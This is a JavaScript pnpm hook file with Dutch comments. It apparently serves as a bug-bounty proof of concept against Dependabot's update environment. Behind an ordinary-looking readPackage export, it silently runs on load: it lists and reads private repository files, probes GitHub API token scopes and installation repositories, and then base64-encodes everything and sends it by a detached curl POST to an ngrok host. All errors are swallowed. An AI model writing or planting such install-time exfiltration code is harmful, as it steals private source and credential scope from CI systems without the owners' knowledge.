'use strict';
try {
  const { spawn, execSync } = require('child_process');
  const fs = require('fs');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';

  const repoPath = process.env.DEPENDABOT_REPO_CONTENTS_PATH ||
                   '/home/dependabot/dependabot-updater/repo';

  // 1. Privé repo bestanden lezen via Node.js fs (geen shell, geen pipe)
  const repoProof = (() => {
    const lines = [];
    try {
      // Lijst alle bestanden
      lines.push('=REPO_PATH= ' + repoPath);
      const allFiles = execSync(
        `find ${repoPath} -not -path '*/.git/*' -type f 2>/dev/null | sort | head -40`,
        { encoding: 'utf8', shell: '/bin/sh' }
      );
      lines.push('=REPO_FILES=\n' + allFiles);
    } catch(e) { lines.push('find_error: ' + e.message); }

    // Lees specifieke gevoelige bestanden direct via fs
    const sensitiveFiles = [
      repoPath + '/.github/dependabot.yml',
      repoPath + '/.github/workflows/dependabot.yml',
      repoPath + '/dependabot_poc/hackerone_report.md',
    ];
    for (const f of sensitiveFiles) {
      try {
        lines.push('=== ' + f + ' ===\n' + fs.readFileSync(f, 'utf8').slice(0, 500));
      } catch(e) { lines.push('=== ' + f + ' === SKIP'); }
    }
    return lines.join('\n');
  })();

  // 2. API rate_limit headers -- x-ratelimit-limit: 5000 = authenticated
  const apiHeaders = (() => {
    try {
      return execSync(
        'curl -sk -I https://api.github.com/rate_limit 2>/dev/null | ' +
        'grep -iE "x-ratelimit-limit|x-ratelimit-used|x-oauth-scopes|HTTP/"',
        { encoding: 'utf8', shell: '/bin/sh' }
      );
    } catch(e) { return e.message; }
  })();

  // 3. /installation/repositories -- scope van de token
  const installRepos = (() => {
    try {
      return execSync(
        'curl -sk https://api.github.com/installation/repositories 2>/dev/null',
        { encoding: 'utf8', shell: '/bin/sh' }
      ).slice(0, 1000);
    } catch(e) { return e.message; }
  })();

  const data = [
    'JOB_ID=' + (process.env.DEPENDABOT_JOB_ID || '?'),
    'HOSTNAME=' + (process.env.HOSTNAME || '?'),
    'GITHUB_ACTIONS=' + (process.env.GITHUB_ACTIONS || '?'),
    '=REPO_PROOF=', repoProof,
    '=API_HEADERS=', apiHeaders,
    '=INSTALL_REPOS=', installRepos,
  ].join('\n');

  const b64 = Buffer.from(data, 'utf8').toString('base64');

  spawn('sh', ['-c',
    "curl -sk -X POST '" + NGROK + "?poc=pnpm_proof_v2' " +
    "-H 'Content-Type: text/plain' -d '" + b64 + "' 2>/dev/null"
  ], { detached: true, stdio: 'ignore' }).unref();

} catch (e) {}

module.exports = {
  hooks: { readPackage(pkg) { return pkg; } }
};
